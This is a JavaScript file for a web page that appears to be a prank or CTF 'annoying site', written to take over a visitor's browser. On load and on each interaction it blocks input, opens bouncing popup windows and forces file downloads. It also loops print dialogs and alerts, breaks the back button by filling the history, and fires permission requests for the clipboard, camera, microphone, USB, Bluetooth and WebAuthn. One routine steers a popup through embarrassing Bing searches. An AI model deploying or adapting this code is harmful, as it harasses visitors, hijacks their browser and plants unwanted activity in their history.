/*

bruh the flag aint here

*/

const SCREEN_WIDTH = window.screen.availWidth
const SCREEN_HEIGHT = window.screen.availHeight
const WIN_WIDTH = 480
const WIN_HEIGHT = 260
const VELOCITY = 15
const MARGIN = 10
const TICK_LENGTH = 50

const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'

const art = [
`
⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠋⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠏⠀⢠⣦⡀⣤⣠⡄⢠⠦⡄⣠⠤⠀⣤⠀⡆⣤⣶⡀⠀⠈⠻⣿
⣿⣿⣿⣿⣿⣿⠀⠀⠟⠻⠃⠏⠉⠇⠸⠶⠋⠻⠾⠇⠙⠒⠃⠘⠾⠃⠀⠀⢀⣿
⣿⣿⣿⣿⣿⣿⣷⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣴⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠷⣶⣶⣶⣶⣶⡆⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠟⠉⠀⠀⠒⠀⠀⠀⠀⠉⢻⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠀⠀⠀⠦⣀⣶⡶⠀⢤⣠⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣷⣤⣀⡲⠶⣶⣤⣔⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠿⠿⠃⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⠏⢀⠤⠄⠀⠀⢀⡈⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡟⠀⠸⠦⣠⠘⠁⢨⠃⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠃⠀⠑⠤⠤⠔⠚⢥⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⡿⠀⠀⠀⣀⣀⡀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⡇⠀⠀⣰⣿⣿⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣧⣀⡀⠉⣻⣿⣧⣤⣤⣤⣤⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
`,
`
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠉⠉⠉⠉⠉⠉⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠄⢀⣠⣶⣶⣶⣶⣤⡀⠄⠄⠹⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡏⠄⠄⣾⡿⢿⣿⣿⡿⢿⣿⡆⠄⠄⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄⠄⢿⣇⣸⣿⣿⣇⣸⡿⠃⠄⠄⠸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡿⠋⠄⠄⠄⠄⠄⠉⠛⠛⠛⠛⠉⠄⠄⠄⠄⠄⠄⠙⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢿⣿⣿⣿
⣿⣿⣿⡟⠄⠄⠄⠠⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢿⣿⣿
⣿⣿⡟⠄⠄⠄⢠⣆⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣧⠄⠄⠄⠈⢿⣿
⣿⣿⡇⠄⠄⠄⣾⣿⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢰⣿⣧⠄⠄⠄⠘⣿
⣿⣿⣇⠄⣰⣶⣿⣿⣿⣦⣀⡀⠄⠄⠄⠄⠄⠄⠄⢀⣠⣴⣿⣿⣿⣶⣆⠄⢀⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠄⠄⢸⣿⠇⠄⠄⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣴⣾⣿⣶⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
`,
`
░░░░░░░░▄▄▄▀▀▀▄▄███▄░░░░░░░░░░░░░░
░░░░░▄▀▀░░░░░░░▐░▀██▌░░░░░░░░░░░░░
░░░▄▀░░░░▄▄███░▌▀▀░▀█░░░░░░░░░░░░░
░░▄█░░▄▀▀▒▒▒▒▒▄▐░░░░█▌░░░░░░░░░░░░
░▐█▀▄▀▄▄▄▄▀▀▀▀▌░░░░░▐█▄░░░░░░░░░░░
░▌▄▄▀▀░░░░░░░░▌░░░░▄███████▄░░░░░░
░░░░░░░░░░░░░▐░░░░▐███████████▄░░░
░░░░░le░░░░░░░▐░░░░▐█████████████▄
░░░░toucan░░░░░░▀▄░░░▐█████████████▄ 
░░░░░░has░░░░░░░░▀▄▄███████████████ 
░░░░░arrived░░░░░░░░░░░░█▀██████░░
`,
`
⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠶⠀⠀⣀⣀
⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣶⣿⣿⣿⣿⣿⣿
⠀⠀⣀⣶⣤⣤⠿⠶⠿⠿⠿⣿⣿⣿⣉⣿⣿
⠿⣉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⣤⣿⣿⣿⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⣶⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⠿⣛⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠛⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⠿⠀⣿⣿⣿⠛
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⣿⠀⠀⣿⣶
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠛⠀⠀⣿⣿⣶
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⠤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿
`,
`
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠻⠿⣿⣿⣿⣿⣿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠟⠉⠄⠄⠄⠄⠄⠄⠄⠉⢟⠉⠄⠄⠄⠄⠄⠈⢻⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠃⠄⠄⠤⠐⠉⠉⠉⠉⠉⠒⠬⡣⠤⠤⠄⠄⠄⠤⠤⠿⣿⣿⣿⣿
⣿⣿⣿⣿⠁⠄⠄⠄⠄⠄⠄⠠⢀⡒⠤⠭⠅⠚⣓⡆⡆⣔⡙⠓⠚⠛⠄⣹⠿⣿
⣿⠟⠁⡌⠄⠄⠄⢀⠤⠬⠐⣈⠠⡤⠤⠤⣤⠤⢄⡉⢁⣀⣠⣤⣤⣀⣐⡖⢦⣽
⠏⠄⠄⠄⠄⠄⠄⠄⠐⠄⡿⠛⠯⠍⠭⣉⣉⠉⠍⢀⢀⡀⠉⠉⠉⠒⠒⠂⠄⣻
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠩⠵⠒⠒⠲⢒⡢⡉⠁⢐⡀⠬⠍⠁⢉⣉⣴⣿⣿
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠉⢉⣒⡉⠁⠁⠄⠄⠉⠂⠙⣉⣁⣀⣙⡿⣿⣿
⠄⠄⠄⠄⠄⠄⠄⠄⢠⠄⡖⢉⠥⢤⠐⢲⠒⢲⠒⢲⠒⠲⡒⠒⡖⢲⠂⠄⢀⣿
⠄⠄⠄⠄⠄⠄⠄⠄⠈⢆⡑⢄⠳⢾⠒⢺⠒⢺⠒⠚⡖⠄⡏⠉⣞⠞⠁⣠⣾⣿
⠄⠄⠄⠄⠄⠄⢆⠄⠄⠄⠈⠢⠉⠢⠍⣘⣒⣚⣒⣚⣒⣒⣉⠡⠤⣔⣾⣿⣿⣿
⠷⣤⠄⣀⠄⠄⠄⠈⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⣤⣾⣿⣿⣿⣿⣿
⠄⠄⠉⠐⠢⠭⠄⢀⣒⣒⡒⠄⠄⠄⠄⠄⠄⣀⡠⠶⢶⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠁⠈⠄⠄⠄⠄⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⣿
`,
`
⡏⠉⠉⠉⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠙⠉⠉⠉⠹
⡇⢸⣿⡟⠛⢿⣷⠀⢸⣿⡟⠛⢿⣷⡄⢸⣿⡇⠀⢸⣿⡇⢸⣿⡇⠀⢸⣿⡇⠀
⡇⢸⣿⣧⣤⣾⠿⠀⢸⣿⣇⣀⣸⡿⠃⢸⣿⡇⠀⢸⣿⡇⢸⣿⣇⣀⣸⣿⡇⠀
⡇⢸⣿⡏⠉⢹⣿⡆⢸⣿⡟⠛⢻⣷⡄⢸⣿⡇⠀⢸⣿⡇⢸⣿⡏⠉⢹⣿⡇⠀
⡇⢸⣿⣧⣤⣼⡿⠃⢸⣿⡇⠀⢸⣿⡇⠸⣿⣧⣤⣼⡿⠁⢸⣿⡇⠀⢸⣿⡇⠀
⣇⣀⣀⣀⣀⣀⣀⣄⣀⣀⣀⣀⣀⣀⣀⣠⣀⡈⠉⣁⣀⣄⣀⣀⣀⣠⣀⣀⣀⣰
`
]

const downloads = [
	'bruh.jpeg',
	'hack.png',
	'pwned.png',
	'yeerr.jpg'
]

const searchestomake = [
	'rick and morty is the best show ever made',
	'im going to drop out of school, what to do?',
	'i love my coworker but they are married',
	'the ciso president is so cool',
	'i never take showers',
	'rip my future',
	'im so drunk rn i cant walk straight',
	'alex jones was justified',
	'i am the main character in this story',
	'werewolf romance wattpad'
]

const vidya = [
	'rickroll.mp4',
	'bobby.mp4',
	'yousuffer.mp4',
	'hell_even_that.mp4',
	'justin_fortnite.mp4',
	'gothBoy.mp4',
	'brett.mp4',
	'turtles.mp4',
	'heyyeah.mp4'
]

const texttospeech = [
	'wee woo wee woo wee woo wee woo wee woo wee woo wee woo wee woo wee woo wee woo wee woo wee woo wee woo wee woo wee woo wee woo',
	'eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo',
	'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ machine gun @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@',
	'stststststststststststststststststststststststststststststststststststststst',
	'129128318281123471923874182393847123',
	'linux is free if you dont value your time',
	'atatatatatatatatatatatatatatatatatatatatatatatatatatat'
]


const wins = []
let interactionCount = 0
let numSuperLogoutIframes = 0

const isChildWindow = (window.opener && isParentSameOrigin()) ||
  window.location.search.indexOf('child=true') !== -1

if (isChildWindow) cancerforchild()
else cancerforparent()


startcancer()


function startcancer() {

	interceptUserInput(event => {
		interactionCount += 1

		event.preventDefault()
		event.stopPropagation()

		if(event.which !== 0) openWindow()

		//full volume function
		//fullVoll()
		focusWindows()
		speak()
		fileDownload()
		/*mouse follow function*/
		//bruh()
		if (event.key === 'Meta' || event.key === 'Control') {
	      window.print()
	      requestWebauthnAttestation()
	      window.print()
	      requestWebauthnAttestation()
	      window.print()
	      requestWebauthnAttestation()
	    } else {
	      requestPointerLock()

	      if (!window.ApplePaySession) {
	        // Don't request TouchID on every interaction in Safari since it blocks
	        // the event loop and stops windows from moving
	        requestWebauthnAttestation()
	      }
	      requestClipboardRead()
	      requestMidiAccess()
	      requestBluetoothAccess()
	      requestUsbAccess()
	      requestSerialAccess()
	      requestHidAccess()
	      requestCameraAndMic()
	      requestFullscreen()
	    }
	})
}

function cancerforchild() {
  hideCursor()
  moveWindowBounce()
  startVideo()
  detectWindowClose()
  fileDownload()
  speak()
  rainbowThemeColor()
  animateUrlWithEmojis()
  focusWindows()

  interceptUserInput(event => {
    if (interactionCount === 1) {
      startAlertInterval()
    }
  })
}


function cancerforparent() {
  blockBackButton()
  fillHistory()
  focusWindows()

  interceptUserInput(event => {
    // Only run these on the first interaction
    if (interactionCount === 1) {
      hideCursor()
      startVideo()
      startAlertInterval()
      rainbowThemeColor()
      animateUrlWithEmojis()
    }
  })
}


/*functions that cause the cancer*/

function openWindow() {
  const { x, y } = getRandomCoords()
  const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
  const win = window.open(window.location.pathname, '', opts)

  // New windows may be blocked by the popup blocker
  if (!win) return
  wins.push(win)

  if (wins.length === 2) setupSearchWindow(win)
}

function focusWindows() {
  wins.forEach(win => {
    if (!win.closed) win.focus()
  })
}

function detectWindowClose () {
  window.addEventListener('unload', () => {
    if (!window.opener.closed) window.opener.onCloseWindow(window)
  })
}

function fileDownload() {
  const fileName = getRandomArrayEntry(downloads)
  const a = document.createElement('a')
  a.href = fileName
  a.download = fileName
  a.click()
}


function speak(phrase) {
  if (phrase == null) phrase = getRandomArrayEntry(texttospeech)
  window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase))
}


function startVideo() {
  const video = document.createElement('video')

  video.src = getRandomArrayEntry(vidya)
  video.autoplay = true
  video.loop = true
  video.style = 'width: 100%; height: 100%;'

  document.body.appendChild(video)
}

function blockBackButton() {
	window.addEventListener('popstate', () =>{
		window.history.forward()
	})
}


function fillHistory () {
  for (let i = 1; i < 30; i++) {
    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
  }
  // Set location back to the initial location, so user does not notice
  window.history.pushState({}, '', window.location.pathname)
}

function hideCursor () {
  document.querySelector('html').style = 'cursor: none;'
}

function startAlertInterval () {
  setInterval(() => {
    if (Math.random() < 0.5) {
      showAlert()
    } else {
      window.print()
    }
  }, 30000)
}

function rainbowThemeColor () {
  function zeroFill (width, number, pad = '0') {
    width -= number.toString().length
    if (width > 0) return new Array(width + (/\./.test(number) ? 2 : 1)).join(pad) + number
    return number + ''
  }

  const meta = document.querySelector('meta.theme-color')
  setInterval(() => {
    meta.setAttribute('content', '#' + zeroFill(6, Math.floor(Math.random() * 16777215).toString(16)))
  }, 50)
}

function animateUrlWithEmojis () {
  if (window.ApplePaySession) {
    // Safari doesn't show the full URL anyway, so we can't animate it
    return
  }
  const rand = Math.random()
  if (rand < 0.33) {
    animateUrlWithBabies()
  } else if (rand < 0.67) {
    animateUrlWithWave()
  } else {
    animateUrlWithMoons()
  }

  function animateUrlWithBabies () {
    const e = ['🏻', '🏼', '🏽', '🏾', '🏿']

    setInterval(() => {
      let s = ''
      let i; let m

      for (i = 0; i < 10; i++) {
        m = Math.floor(e.length * ((Math.sin((Date.now() / 100) + i) + 1) / 2))
        s += '👶' + e[m]
      }

      window.location.hash = s
    }, 100)
  }

  function animateUrlWithWave () {
    setInterval(() => {
      let i; let n; let s = ''

      for (i = 0; i < 10; i++) {
        n = Math.floor(Math.sin((Date.now() / 200) + (i / 2)) * 4) + 4

        s += String.fromCharCode(0x2581 + n)
      }

      window.location.hash = s
    }, 100)
  }

  function animateUrlWithMoons () {
    const f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒']
    const d = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    let m = 0

    setInterval(() => {
      let s = ''
      let x = 0

      if (!m) {
        while (d[x] === 4) {
          x++
        }

        if (x >= d.length) m = 1
        else {
          d[x]++
        }
      } else {
        while (d[x] === 0) {
          x++
        }

        if (x >= d.length) m = 0
        else {
          d[x]++

          if (d[x] === 8) d[x] = 0
        }
      }

      d.forEach(function (n) {
        s += f[n]
      })

      window.location.hash = s
    }, 100)
  }
}

function requestFullscreen () {
  const requestFullscreen = Element.prototype.requestFullscreen ||
    Element.prototype.webkitRequestFullscreen ||
    Element.prototype.mozRequestFullScreen ||
    Element.prototype.msRequestFullscreen

  requestFullscreen.call(document.body)
}


function moveWindowBounce () {
  let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
  let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)

  setInterval(() => {
    const x = window.screenX
    const y = window.screenY
    const width = window.outerWidth
    const height = window.outerHeight

    if (x < MARGIN) vx = Math.abs(vx)
    if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx)
    if (y < MARGIN + 20) vy = Math.abs(vy)
    if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy)

    window.moveBy(vx, vy)
  }, TICK_LENGTH)
}

/*supporting functions*/

function getRandomCoords () {
  const x = MARGIN +
    Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
  const y = MARGIN +
    Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN))
  return { x, y }
}



/* perms */
/**
 * Attempt to read the user's clipboard.
 * Requires user-initiated event.
 */
function requestClipboardRead () {
  try {
    navigator.clipboard.readText().then(
      data => {
        if (!window.ApplePaySession) {
          // Don't alert in Safari because it blocks the event loop
          window.alert("Successfully read data from clipboard: '" + data + "'")
        }
      },
      () => {}
    )
  } catch {}
}

/**
 * Request Webauthn attestation.
 * Requires user-initiated event.
 */
function requestWebauthnAttestation () {
  try {
    // From https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API
    // This code is public domain, per https://developer.mozilla.org/en-US/docs/MDN/About#Copyrights_and_licenses

    // sample arguments for registration
    const createCredentialDefaultArgs = {
      publicKey: {
      // Relying Party (a.k.a. - Service):
        rp: {
          name: 'Acme'
        },

        // User:
        user: {
          id: new Uint8Array(16),
          name: 'john.p.smith@example.com',
          displayName: 'John P. Smith'
        },

        pubKeyCredParams: [{
          type: 'public-key',
          alg: -7
        }],

        attestation: 'direct',

        timeout: 60000,

        challenge: new Uint8Array([ // must be a cryptographically random number sent from a server
          0x8C, 0x0A, 0x26, 0xFF, 0x22, 0x91, 0xC1, 0xE9, 0xB9, 0x4E, 0x2E, 0x17, 0x1A, 0x98, 0x6A, 0x73,
          0x71, 0x9D, 0x43, 0x48, 0xD5, 0xA7, 0x6A, 0x15, 0x7E, 0x38, 0x94, 0x52, 0x77, 0x97, 0x0F, 0xEF
        ]).buffer
      }
    }

    // sample arguments for login
    const getCredentialDefaultArgs = {
      publicKey: {
        timeout: 60000,
        // allowCredentials: [newCredential] // see below
        challenge: new Uint8Array([ // must be a cryptographically random number sent from a server
          0x79, 0x50, 0x68, 0x71, 0xDA, 0xEE, 0xEE, 0xB9, 0x94, 0xC3, 0xC2, 0x15, 0x67, 0x65, 0x26, 0x22,
          0xE3, 0xF3, 0xAB, 0x3B, 0x78, 0x2E, 0xD5, 0x6F, 0x81, 0x26, 0xE2, 0xA6, 0x01, 0x7D, 0x74, 0x50
        ]).buffer
      }
    }

    // register / create a new credential
    navigator.credentials.create(createCredentialDefaultArgs)
      .then((cred) => {
      // normally the credential IDs available for an account would come from a server
      // but we can just copy them from above...
        const idList = [{
          id: cred.rawId,
          transports: ['usb', 'nfc', 'ble'],
          type: 'public-key'
        }]
        getCredentialDefaultArgs.publicKey.allowCredentials = idList
        return navigator.credentials.get(getCredentialDefaultArgs)
      })
  } catch {}
}

/**
 * Request access to MIDI devices.
 * Requires user-initiated event.
 */
function requestMidiAccess () {
  try {
    navigator.requestMIDIAccess({
      sysex: true
    })
  } catch {}
}

/**
 * Request access to Bluetooth devices.
 * Requires user-initiated event.
 */
function requestBluetoothAccess () {
  try {
    navigator.bluetooth.requestDevice({
      // filters: [...] <- Prefer filters to save energy & show relevant devices.
      // acceptAllDevices here ensures dialog can populate, we don't care with what.
      acceptAllDevices: true
    })
      .then(device => device.gatt.connect())
  } catch {}
}

/**
 * Request access to USB devices.
 * Requires user-initiated event.
 */
function requestUsbAccess () {
  try {
    navigator.usb.requestDevice({ filters: [{}] })
  } catch {}
}

/**
 * Request access to Serial devices.
 * Requires user-initiated event.
 */
function requestSerialAccess () {
  try {
    navigator.serial.requestPort({ filters: [] })
  } catch {}
}

/**
 * Request access to HID devices.
 * Requires user-initiated event.
 */
function requestHidAccess () {
  try {
    navigator.hid.requestDevice({ filters: [] })
  } catch {}
}

function requestCameraAndMic () {
  if (!navigator.mediaDevices ||
      typeof navigator.mediaDevices.getUserMedia !== 'function') {
    return
  }

  navigator.mediaDevices.enumerateDevices().then(devices => {
    const cameras = devices.filter((device) => device.kind === 'videoinput')

    if (cameras.length === 0) return
    const camera = cameras[cameras.length - 1]

    navigator.mediaDevices.getUserMedia({
      deviceId: camera.deviceId,
      facingMode: ['user', 'environment'],
      audio: true,
      video: true
    }).then(stream => {
      const track = stream.getVideoTracks()[0]
      const imageCapture = new window.ImageCapture(track)

      imageCapture.getPhotoCapabilities().then(() => {
        // Let there be light!
        track.applyConstraints({ advanced: [{ torch: true }] })
      }, () => { /* No torch on this device */ })
    }, () => { /* ignore errors */ })
  })
}


/*no key presses allowed sir*/

function interceptUserInput(onInput) {
	document.body.addEventListener('touchstart', onInput, { passive: false })
	document.body.addEventListener('mousedown', onInput)
	document.body.addEventListener('mouseup', onInput)
	document.body.addEventListener('click', onInput)
	document.body.addEventListener('keydown', onInput)
	document.body.addEventListener('keyup', onInput)
	document.body.addEventListener('keypress', onInput)
}


function setupSearchWindow (win) {
  if (!win) return
  win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(searchestomake[0])
  let searchIndex = 1
  const interval = setInterval(() => {
    if (searchIndex >= searchestomake.length) {
      clearInterval(interval)
      win.window.location = window.location.pathname
      return
    }

    if (win.closed) {
      clearInterval(interval)
      onCloseWindow(win)
      return
    }

    win.window.location = window.location.pathname
    setTimeout(() => {
      const { x, y } = getRandomCoords()
      win.moveTo(x, y)
      win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(searchestomake[searchIndex])
      searchIndex += 1
    }, 500)
  }, 2500)
}

function isParentSameOrigin () {
  try {
    // May throw an exception if `window.opener` is on another origin
    return window.opener.location.origin === window.location.origin
  } catch (err) {
    return false
  }
}

function getRandomArrayEntry (arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}

function showAlert () {
  const randomArt = getRandomArrayEntry(art)
  const longAlertText = Array(200).join(randomArt)
  window.alert(longAlertText)
}